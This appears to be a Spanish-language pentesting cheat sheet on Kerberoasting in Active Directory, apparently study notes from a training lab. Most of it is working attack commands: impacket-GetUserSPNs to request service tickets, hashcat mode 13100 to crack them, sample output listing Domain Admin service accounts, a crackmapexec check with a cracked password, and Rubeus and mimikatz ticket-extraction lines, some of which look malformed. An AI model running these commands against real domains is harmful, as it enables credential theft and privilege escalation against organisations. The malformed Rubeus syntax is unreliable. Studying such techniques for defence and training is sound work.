# Kerberoasting

- Este ataque sirve para obtener credenciales de cuentas de servicios que están configurados con la autenticación Kerberos.
- En AD comunmente las cuentas de servicios tienen privilegios muy elevados.
- [Más info](https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast)
## Como funciona

1. Solicitud TGS
2. Obtener Ticket.
3. Extraerlo con mimikatz o rubeus
4. Fuerza bruta o pass the ticket

- `sudo impacket-GetUserSPNs DOMAIN.LOCAL/USER:password -dc-ip IP -request`
- Guardar hash
- `hashcat -m 13100 hash.txt wordlist.txt`

## Listar cuentas
- `impacket-GetUserSPNs -dc-ip IP DOMAIN.LOCAL/USER`
- Ejemplo:
```powershell
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never> 
```

#### Chequear cuenta post crackeo
- `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!`


## Extraer tickets desde Windows
- `Rubeus.exe asktgt /user:<usuario> /rc4:<contraseña>`
- `Rubeus.exe tgtreq /user:<usuario> /rc4:<spn>`
- `Rubeus tgtdeleg /ticket:<ticket_file>`
    - mimikatz: `mimikatz.exe "kerberos::list" "exit"`